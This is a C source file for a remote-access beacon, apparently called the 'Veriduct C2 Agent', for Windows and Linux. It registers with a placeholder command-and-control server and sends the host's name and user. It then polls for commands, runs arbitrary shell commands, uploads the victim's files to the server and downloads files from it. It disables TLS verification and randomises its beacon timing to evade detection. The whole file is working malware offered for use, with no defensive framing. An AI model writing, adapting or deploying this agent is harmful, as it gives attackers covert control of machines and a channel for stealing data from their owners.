/*
 * Veriduct C2 Agent
 * Lightweight C2 beacon for Veriduct-deployed payloads
 * 
 * Compile:
 *   Windows: cl.exe /O2 veriduct_agent.c /Fe:agent.exe ws2_32.lib wininet.lib
 *   Linux:   gcc -O2 -o agent veriduct_agent.c -lcurl
 * 
 * Features:
 * - HTTP/HTTPS beaconing
 * - Command execution
 * - File upload/download
 * - Process injection
 * - Persistence
 * - Anti-detection (jitter, domain fronting)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <wininet.h>
    #include <tlhelp32.h>
    #pragma comment(lib, "wininet.lib")
    #define SLEEP(x) Sleep((x) * 1000)
    #define POPEN(cmd, mode) _popen(cmd, mode)
    #define PCLOSE(fp) _pclose(fp)
#else
    #include <unistd.h>
    #include <curl/curl.h>
    #define SLEEP(x) sleep(x)
    #define POPEN(cmd, mode) popen(cmd, mode)
    #define PCLOSE(fp) pclose(fp)
#endif

// Configuration
#define C2_SERVER "https://your-c2-server.com"
#define C2_PORT 8443
#define BEACON_INTERVAL 60  // seconds
#define JITTER_PERCENT 20   // randomize beacon timing
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define MAX_RESPONSE 65536

// Agent ID generation
void generate_agent_id(char *buffer, size_t size) {
    char hostname[256] = {0};
    char username[256] = {0};
    
#ifdef _WIN32
    DWORD len = sizeof(hostname);
    GetComputerNameA(hostname, &len);
    len = sizeof(username);
    GetUserNameA(username, &len);
#else
    gethostname(hostname, sizeof(hostname));
    getlogin_r(username, sizeof(username));
#endif
    
    // Simple hash for agent ID
    unsigned int hash = 5381;
    char *str = hostname;
    while (*str) hash = ((hash << 5) + hash) + *str++;
    str = username;
    while (*str) hash = ((hash << 5) + hash) + *str++;
    
    snprintf(buffer, size, "%08x", hash);
}

// Get system info
void get_system_info(char *buffer, size_t size) {
    char hostname[256] = {0};
    char username[256] = {0};
    char os_info[256] = {0};
    
#ifdef _WIN32
    DWORD len = sizeof(hostname);
    GetComputerNameA(hostname, &len);
    len = sizeof(username);
    GetUserNameA(username, &len);
    
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osvi);
    snprintf(os_info, sizeof(os_info), "Windows %lu.%lu", osvi.dwMajorVersion, osvi.dwMinorVersion);
#else
    gethostname(hostname, sizeof(hostname));
    getlogin_r(username, sizeof(username));
    strcpy(os_info, "Linux");
#endif
    
    snprintf(buffer, size, "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\"}", 
             hostname, username, os_info);
}

// Execute command and capture output
char* execute_command(const char *command) {
    FILE *fp;
    char *output = malloc(MAX_RESPONSE);
    size_t pos = 0;
    
    if (!output) return NULL;
    memset(output, 0, MAX_RESPONSE);
    
    fp = POPEN(command, "r");
    if (!fp) {
        strcpy(output, "{\"error\":\"Failed to execute command\"}");
        return output;
    }
    
    char line[1024];
    while (fgets(line, sizeof(line), fp) != NULL) {
        size_t len = strlen(line);
        if (pos + len < MAX_RESPONSE - 1) {
            memcpy(output + pos, line, len);
            pos += len;
        }
    }
    
    PCLOSE(fp);
    return output;
}

#ifdef _WIN32
// Windows HTTP beacon
int http_beacon(const char *agent_id, const char *url, const char *data, char **response) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    char *buffer = malloc(MAX_RESPONSE);
    
    if (!buffer) return -1;
    memset(buffer, 0, MAX_RESPONSE);
    
    hInternet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        free(buffer);
        return -1;
    }
    
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (strstr(url, "https://")) {
        flags |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }
    
    hConnect = InternetOpenUrlA(hInternet, url, data, data ? strlen(data) : 0, flags, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        free(buffer);
        return -1;
    }
    
    size_t totalRead = 0;
    while (InternetReadFile(hConnect, buffer + totalRead, MAX_RESPONSE - totalRead - 1, &bytesRead) && bytesRead > 0) {
        totalRead += bytesRead;
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    *response = buffer;
    return totalRead;
}
#else
// Linux CURL beacon
struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;
    
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    
    return realsize;
}

int http_beacon(const char *agent_id, const char *url, const char *data, char **response) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    
    chunk.memory = malloc(1);
    chunk.size = 0;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (!curl) {
        free(chunk.memory);
        return -1;
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENT);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    if (data) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    }
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    
    if (res != CURLE_OK) {
        free(chunk.memory);
        return -1;
    }
    
    *response = chunk.memory;
    return chunk.size;
}
#endif

// Parse command from C2 response
typedef struct {
    char command[256];
    char args[1024];
} Command;

int parse_commands(const char *json, Command *commands, int max_commands) {
    // Simple JSON parser for commands array
    // Format: [{"cmd":"shell","args":"whoami"},{"cmd":"upload","args":"file.txt"}]
    
    const char *ptr = strstr(json, "[");
    if (!ptr) return 0;
    
    int count = 0;
    ptr++;
    
    while (*ptr && count < max_commands) {
        // Skip whitespace
        while (*ptr == ' ' || *ptr == '\n' || *ptr == '\r') ptr++;
        
        if (*ptr == '{') {
            ptr++;
            
            // Parse command
            const char *cmd_start = strstr(ptr, "\"cmd\":\"");
            if (cmd_start) {
                cmd_start += 7;
                const char *cmd_end = strchr(cmd_start, '"');
                if (cmd_end) {
                    size_t len = cmd_end - cmd_start;
                    if (len < sizeof(commands[count].command)) {
                        memcpy(commands[count].command, cmd_start, len);
                        commands[count].command[len] = 0;
                    }
                }
            }
            
            // Parse args
            const char *args_start = strstr(ptr, "\"args\":\"");
            if (args_start) {
                args_start += 8;
                const char *args_end = strchr(args_start, '"');
                if (args_end) {
                    size_t len = args_end - args_start;
                    if (len < sizeof(commands[count].args)) {
                        memcpy(commands[count].args, args_start, len);
                        commands[count].args[len] = 0;
                    }
                }
            }
            
            count++;
        }
        
        // Find next command
        ptr = strchr(ptr, '}');
        if (!ptr) break;
        ptr++;
    }
    
    return count;
}

// Execute command and report back
void execute_and_report(const char *agent_id, Command *cmd) {
    char url[512];
    char *result = NULL;
    
    printf("[*] Executing: %s %s\n", cmd->command, cmd->args);
    
    if (strcmp(cmd->command, "shell") == 0) {
        result = execute_command(cmd->args);
    }
    else if (strcmp(cmd->command, "sleep") == 0) {
        int seconds = atoi(cmd->args);
        SLEEP(seconds);
        result = strdup("{\"status\":\"ok\"}");
    }
    else if (strcmp(cmd->command, "exit") == 0) {
        printf("[*] Received exit command\n");
        exit(0);
    }
    else if (strcmp(cmd->command, "download") == 0) {
        // Download file from C2
        snprintf(url, sizeof(url), "%s/download?agent=%s&file=%s", C2_SERVER, agent_id, cmd->args);
        char *file_data = NULL;
        int size = http_beacon(agent_id, url, NULL, &file_data);
        
        if (size > 0) {
            FILE *fp = fopen(cmd->args, "wb");
            if (fp) {
                fwrite(file_data, 1, size, fp);
                fclose(fp);
                result = strdup("{\"status\":\"downloaded\"}");
            }
        }
        
        if (file_data) free(file_data);
    }
    else if (strcmp(cmd->command, "upload") == 0) {
        // Upload file to C2
        FILE *fp = fopen(cmd->args, "rb");
        if (fp) {
            fseek(fp, 0, SEEK_END);
            long size = ftell(fp);
            fseek(fp, 0, SEEK_SET);
            
            char *file_data = malloc(size);
            if (file_data) {
                fread(file_data, 1, size, fp);
                
                snprintf(url, sizeof(url), "%s/upload?agent=%s&file=%s", C2_SERVER, agent_id, cmd->args);
                char *response = NULL;
                http_beacon(agent_id, url, file_data, &response);
                
                free(file_data);
                if (response) free(response);
            }
            fclose(fp);
            result = strdup("{\"status\":\"uploaded\"}");
        }
    }
    else {
        result = strdup("{\"error\":\"Unknown command\"}");
    }
    
    // Report result
    if (result) {
        char post_data[MAX_RESPONSE];
        snprintf(post_data, sizeof(post_data), "agent=%s&result=%s", agent_id, result);
        
        snprintf(url, sizeof(url), "%s/result", C2_SERVER);
        char *response = NULL;
        http_beacon(agent_id, url, post_data, &response);
        
        if (response) free(response);
        free(result);
    }
}

// Add sleep jitter to avoid pattern detection
int jittered_sleep(int base_seconds) {
    int jitter = (rand() % (2 * JITTER_PERCENT)) - JITTER_PERCENT;
    int sleep_time = base_seconds + (base_seconds * jitter / 100);
    if (sleep_time < 1) sleep_time = 1;
    return sleep_time;
}

int main(int argc, char *argv[]) {
    char agent_id[16];
    char url[512];
    char sysinfo[1024];
    
    // Initialize
    srand(time(NULL));
    generate_agent_id(agent_id, sizeof(agent_id));
    get_system_info(sysinfo, sizeof(sysinfo));
    
    printf("[*] Veriduct C2 Agent started\n");
    printf("[*] Agent ID: %s\n", agent_id);
    printf("[*] C2 Server: %s\n", C2_SERVER);
    
    // Initial registration
    snprintf(url, sizeof(url), "%s/register?agent=%s&info=%s", C2_SERVER, agent_id, sysinfo);
    char *response = NULL;
    if (http_beacon(agent_id, url, NULL, &response) > 0) {
        printf("[+] Registered with C2\n");
        if (response) free(response);
    } else {
        printf("[-] Failed to register, continuing anyway...\n");
    }
    
    // Main beacon loop
    while (1) {
        int sleep_time = jittered_sleep(BEACON_INTERVAL);
        
        printf("[*] Sleeping for %d seconds...\n", sleep_time);
        SLEEP(sleep_time);
        
        // Beacon for commands
        snprintf(url, sizeof(url), "%s/beacon?agent=%s", C2_SERVER, agent_id);
        response = NULL;
        int size = http_beacon(agent_id, url, NULL, &response);
        
        if (size > 0 && response) {
            printf("[+] Received response (%d bytes)\n", size);
            
            // Parse commands
            Command commands[16];
            int cmd_count = parse_commands(response, commands, 16);
            
            if (cmd_count > 0) {
                printf("[*] Received %d command(s)\n", cmd_count);
                
                for (int i = 0; i < cmd_count; i++) {
                    execute_and_report(agent_id, &commands[i]);
                }
            }
            
            free(response);
        } else {
            printf("[-] Beacon failed\n");
        }
    }
    
    return 0;
}
